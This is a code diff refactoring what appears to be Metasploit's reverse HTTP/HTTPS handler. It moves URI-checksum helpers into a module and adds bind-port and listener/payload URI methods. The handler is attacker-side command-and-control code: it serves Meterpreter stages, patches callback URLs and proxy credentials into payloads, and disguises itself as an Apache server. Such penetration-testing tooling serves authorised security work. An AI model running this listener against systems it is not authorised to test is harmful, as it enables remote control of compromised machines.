@@ -1,6 +1,7 @@
 # -*- coding: binary -*-
 require 'rex/io/stream_abstraction'
 require 'rex/sync/ref'
+require 'msf/core/handler/reverse_http/uri_checksum'
 
 module Msf
 module Handler
@@ -13,6 +14,7 @@ module Handler
 module ReverseHttp
 
   include Msf::Handler
+  include Msf::Handler::ReverseHttp::UriChecksum
 
   #
   # Returns the string representation of the handler type
@@ -27,120 +29,6 @@ module ReverseHttp
   #
   def self.general_handler_type
     "tunnel"
-  end
-
-  #
-  # Define 8-bit checksums for matching URLs
-  # These are based on charset frequency
-  #
-  URI_CHECKSUM_INITW = 92
-  URI_CHECKSUM_INITJ = 88
-  URI_CHECKSUM_CONN  = 98
-
-  #
-  # Precalculated checkums as fallback
-  #
-  URI_CHECKSUM_PRECALC = [
-    "Zjjaq", "pIlfv", "UvoxP", "sqnx9", "zvoVO", "Pajqy", "7ziuw", "vecYp", "yfHsn", "YLzzp",
-    "cEzvr", "abmri", "9tvwr", "vTarp", "ocrgc", "mZcyl", "xfcje", "nihqa", "40F17", "zzTWt",
-    "E3192", "wygVh", "pbqij", "rxdVs", "ajtsf", "wvuOh", "hwRwr", "pUots", "rvzoK", "vUwby",
-    "tLzyk", "zxbuV", "niaoy", "ukxtU", "vznoU", "zuxyC", "ymvag", "Jxtxw", "404KC", "DE563",
-    "0A7G9", "yorYv", "zzuqP", "czhwo", "949N8", "a1560", "5A2S3", "Q652A", "KR201", "uixtg",
-    "U0K02", "4EO56", "H88H4", "5M8E6", "zudkx", "ywlsh", "luqmy", "09S4I", "L0GG0", "V916E",
-    "KFI11", "A4BN8", "C3E2Q", "UN804", "E75HG", "622eB", "1OZ71", "kynyx", "0RE7F", "F8CR2",
-    "1Q2EM", "txzjw", "5KD1S", "GLR40", "11BbD", "MR8B2", "X4V55", "W994P", "13d2T", "6J4AZ",
-    "HD2EM", "766bL", "8S4MF", "MBX39", "UJI57", "eIA51", "9CZN2", "WH6AA", "a6BF9", "8B1Gg",
-    "J2N6Z", "144Kw", "7E37v", "9I7RR", "PE6MF", "K0c4M", "LR3IF", "38p3S", "39ab3", "O0dO1",
-    "k8H8A", "0Fz3B", "o1PE1", "h7OI0", "C1COb", "bMC6A", "8fU4C", "3IMSO", "8DbFH", "2YfG5",
-    "bEQ1E", "MU6NI", "UCENE", "WBc0E", "T1ATX", "tBL0A", "UGPV2", "j3CLI", "7FXp1", "yN07I",
-    "YE6k9", "KTMHE", "a7VBJ", "0Uq3R", "70Ebn", "H2PqB", "83edJ", "0w5q2", "72djI", "wA5CQ",
-    "KF0Ix", "i7AZH", "M9tU5", "Hs3RE", "F9m1i", "7ecBF", "zS31W", "lUe21", "IvCS5", "j97nC",
-    "CNtR5", "1g8gV", "7KwNG", "DB7hj", "ORFr7", "GCnUD", "K58jp", "5lKo8", "GPIdP", "oMIFJ",
-    "2xYb1", "LQQPY", "FGQlN", "l5COf", "dA3Tn", "v9RWC", "VuAGI", "3vIr9", "aO3zA", "CIfx5",
-    "Gk6Uc", "pxL94", "rKYJB", "TXAFp", "XEOGq", "aBOiJ", "qp6EJ", "YGbq4", "dR8Rh", "g0SVi",
-    "iMr6L", "HMaIl", "yOY1Z", "UXr5Y", "PJdz6", "OQdt7", "EmZ1s", "aLIVe", "cIeo2", "mTTNP",
-    "eVKy5", "hf5Co", "gFHzG", "VhTWN", "DvAWf", "RgFJp", "MoaXE", "Mrq4W", "hRQAp", "hAzYA",
-    "oOSWV", "UKMme", "oP0Zw", "Mxd6b", "RsRCh", "dlk7Q", "YU6zf", "VPDjq", "ygERO", "dZZcL",
-    "dq5qM", "LITku", "AZIxn", "bVwPL", "jGvZK", "XayKP", "rTYVY", "Vo2ph", "dwJYR", "rLTlS",
-    "BmsfJ", "Dyv1o", "j9Hvs", "w0wVa", "iDnBy", "uKEgk", "uosI8", "2yjuO", "HiOue", "qYi4t",
-    "7nalj", "ENekz", "rxca0", "rrePF", "cXmtD", "Xlr2y", "S7uxk", "wJqaP", "KmYyZ", "cPryG",
-    "kYcwH", "FtDut", "xm1em", "IaymY", "fr6ew", "ixDSs", "YigPs", "PqwBs", "y2rkf", "vwaTM",
-    "aq7wp", "fzc4z", "AyzmQ", "epJbr", "culLd", "CVtnz", "tPjPx", "nfry8", "Nkpif", "8kuzg",
-    "zXvz8", "oVQly", "1vpnw", "jqaYh", "2tztj", "4tslx"
-  ]
-
-  #
-  # Use the +refname+ to determine whether this handler uses SSL or not
-  #
-  def ssl?
-    !!(self.refname.index("https"))
-  end
-
-  #
-  # Return a URI of the form scheme://host:port/
-  #
-  # Scheme is one of http or https and host is properly wrapped in [] for ipv6
-  # addresses.
-  #
-  def full_uri
-    unless datastore['HIDDENHOST'].nil? or datastore['HIDDENHOST'].empty?
-      lhost = datastore['HIDDENHOST']
-    else
-      lhost = datastore['LHOST']
-    end
-    if lhost.empty? or lhost == "0.0.0.0" or lhost == "::"
-      lhost = Rex::Socket.source_address
-    end
-    lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-    scheme = (ssl?) ? "https" : "http"
-    unless datastore['HIDDENPORT'].nil? or datastore['HIDDENPORT'] == 0
-      uri = "#{scheme}://#{lhost}:#{datastore["HIDDENPORT"]}/"
-    else
-      uri = "#{scheme}://#{lhost}:#{datastore["LPORT"]}/"
-    end
-
-    uri
-  end
-
-  #
-  # Map "random" URIs to static strings, allowing us to randomize
-  # the URI sent in the first request.
-  #
-  def process_uri_resource(uri_match)
-
-    # This allows 'random' strings to be used as markers for
-    # the INIT and CONN request types, based on a checksum
-    uri_strip, uri_conn = uri_match.split('_', 2)
-    uri_strip.sub!(/^\//, '')
-    uri_check = Rex::Text.checksum8(uri_strip)
-
-    # Match specific checksums and map them to static URIs
-    case uri_check
-    when URI_CHECKSUM_INITW
-      uri_match = "/INITM"
-    when URI_CHECKSUM_INITJ
-      uri_match = "/INITJM"
-    when URI_CHECKSUM_CONN
-      uri_match = "/CONN_" + ( uri_conn || Rex::Text.rand_text_alphanumeric(16) )
-    end
-
-    uri_match
-  end
-
-  #
-  # Create a URI that matches a given checksum
-  #
-  def generate_uri_checksum(sum)
-    chk = ("a".."z").to_a + ("A".."Z").to_a + ("0".."9").to_a
-    32.times do
-      uri = Rex::Text.rand_text_alphanumeric(3)
-      chk.sort_by {rand}.each do |x|
-        return(uri + x) if Rex::Text.checksum8(uri + x) == sum
-      end
-    end
-
-    # Otherwise return one of the pre-calculated strings
-    return URI_CHECKSUM_PRECALC[sum]
   end
 
   #
@@ -163,18 +51,69 @@ module ReverseHttp
         OptString.new('MeterpreterUserAgent', [ false, 'The user-agent that the payload should use for communication', 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)' ]),
         OptString.new('MeterpreterServerName', [ false, 'The server header that the handler will send in response to requests', 'Apache' ]),
         OptAddress.new('ReverseListenerBindAddress', [ false, 'The specific IP address to bind to on the local system']),
+        OptInt.new('ReverseListenerBindPort', [ false, 'The port to bind to on the local system if different from LPORT' ]),
         OptString.new('HttpUnknownRequestResponse', [ false, 'The returned HTML response body when the handler receives a request that is not from a payload', '<html><body><h1>It works!</h1></body></html>'  ])
       ], Msf::Handler::ReverseHttp)
   end
 
-  #
   # Toggle for IPv4 vs IPv6 mode
   #
-  def ipv6
-    self.refname.index('ipv6') ? true : false
+  def ipv6?
+    Rex::Socket.is_ipv6?(datastore['LHOST'])
   end
 
+  # Determine where to bind the server
   #
+  # @return [String]
+  def listener_address
+    if datastore['ReverseListenerBindAddress'].to_s.empty?
+      bindaddr = (ipv6?) ? '::' : '0.0.0.0'
+    else
+      bindaddr = datastore['ReverseListenerBindAddress']
+    end
+
+    bindaddr
+  end
+
+  # @return [String] A URI of the form +scheme://host:port/+
+  def listener_uri
+    if ipv6?
+      listen_host = "[#{listener_address}]"
+    else
+      listen_host = listener_address
+    end
+    "#{scheme}://#{listen_host}:#{datastore['LPORT']}/"
+  end
+
+  # Return a URI suitable for placing in a payload.
+  #
+  # Host will be properly wrapped in square brackets, +[]+, for ipv6
+  # addresses.
+  #
+  # @return [String] A URI of the form +scheme://host:port/+
+  def payload_uri
+    if ipv6?
+      callback_host = "[#{datastore['LHOST']}]"
+    else
+      callback_host = datastore['LHOST']
+    end
+    "#{scheme}://#{callback_host}:#{datastore['LPORT']}/"
+  end
+
+  # Use the {#refname} to determine whether this handler uses SSL or not
+  #
+  def ssl?
+    !!(self.refname.index("https"))
+  end
+
+  # URI scheme
+  #
+  # @return [String] One of "http" or "https" depending on whether we
+  #   are using SSL
+  def scheme
+    (ssl?) ? "https" : "http"
+  end
+
   # Create an HTTP listener
   #
   def setup_handler
@@ -186,17 +125,13 @@ module ReverseHttp
       comm = nil
     end
 
-    # Determine where to bind the HTTP(S) server to
-    bindaddrs = ipv6 ? '::' : '0.0.0.0'
+    local_port = bind_port
 
-    if not datastore['ReverseListenerBindAddress'].to_s.empty?
-      bindaddrs = datastore['ReverseListenerBindAddress']
-    end
 
     # Start the HTTPS server service on this host/port
     self.service = Rex::ServiceManager.start(Rex::Proto::Http::Server,
-      datastore['LPORT'].to_i,
-      bindaddrs,
+      local_port,
+      listener_address,
       ssl?,
       {
         'Msf'        => framework,
@@ -218,7 +153,7 @@ module ReverseHttp
       },
       'VirtualDirectory' => true)
 
-    print_status("Started HTTP#{ssl? ? "S" : ""} reverse handler on #{full_uri}")
+    print_status("Started #{scheme.upcase} reverse handler on #{listener_uri}")
   end
 
   #
@@ -251,7 +186,6 @@ protected
   # Parses the HTTPS request
   #
   def on_request(cli, req, obj)
-    sid  = nil
     resp = Rex::Proto::Http::Response.new
 
     print_status("#{cli.peerhost}:#{cli.peerport} Request received for #{req.relative_resource}...")
@@ -262,7 +196,7 @@ protected
     case uri_match
       when /^\/INITJM/
         conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
-        url = full_uri + conn_id + "/\x00"
+        url = payload_uri + conn_id + "/\x00"
 
         blob = ""
         blob << obj.generate_stage
@@ -325,10 +259,10 @@ protected
               blob[i, proxyinfo.length] = proxyinfo
               print_status("Activated custom proxy #{proxyinfo}, patch at offset #{i}...")
               #Optional authentification
-              unless 	(datastore['PROXY_USERNAME'].nil? or datastore['PROXY_USERNAME'].empty?) or
+              unless (datastore['PROXY_USERNAME'].nil? or datastore['PROXY_USERNAME'].empty?) or
                 (datastore['PROXY_PASSWORD'].nil? or datastore['PROXY_PASSWORD'].empty?) or
                 datastore['PROXY_TYPE'] == 'SOCKS'
-                
+
                 proxy_username_loc = blob.index("METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
                 proxy_username = datastore['PROXY_USERNAME'] << "\x00"
                 blob[proxy_username_loc, proxy_username.length] = proxy_username
@@ -352,7 +286,7 @@ protected
         conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
         i = blob.index("https://" + ("X" * 256))
         if i
-          url = full_uri + conn_id + "/\x00"
+          url = payload_uri + conn_id + "/\x00"
           blob[i, url.length] = url
         end
         print_status("Patched URL at offset #{i}...")
@@ -394,7 +328,7 @@ protected
         create_session(cli, {
           :passive_dispatcher => obj.service,
           :conn_id            => conn_id,
-          :url                => full_uri + conn_id + "/\x00",
+          :url                => payload_uri + conn_id + "/\x00",
           :expiration         => datastore['SessionExpirationTimeout'].to_i,
           :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
           :ssl                => ssl?,
@@ -413,6 +347,12 @@ protected
     obj.service.close_client( cli )
   end
 
+protected
+
+  def bind_port
+    port = datastore['ReverseListenerBindPort'].to_i
+    port > 0 ? port : datastore['LPORT'].to_i
+  end
 
 end
 
